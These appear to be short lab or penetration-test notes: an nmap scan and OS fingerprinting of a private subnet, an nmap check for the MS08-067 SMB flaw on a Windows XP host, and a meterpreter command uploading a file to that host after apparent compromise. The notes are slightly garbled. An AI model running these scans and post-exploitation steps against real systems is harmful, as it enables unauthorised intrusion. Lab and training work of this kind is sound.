1. `nmap -sV -O -p- -v 10.10.111.0/24
1.1. 10.10.111.1 is Linux 3.2 -4.0
     10.10.111.2 is Linux 3.2
     10.10.111.101 is Ubuntu
     10.10.111.102 is Windows 2000 or Windows XP

nmap -v -p445 --script --script smb-vuln-ms08-067.nse 10.10.111.102


meterpreter> upload file.txt C:\\Documents\ and\ Settings\\All\ Users\\Desktop
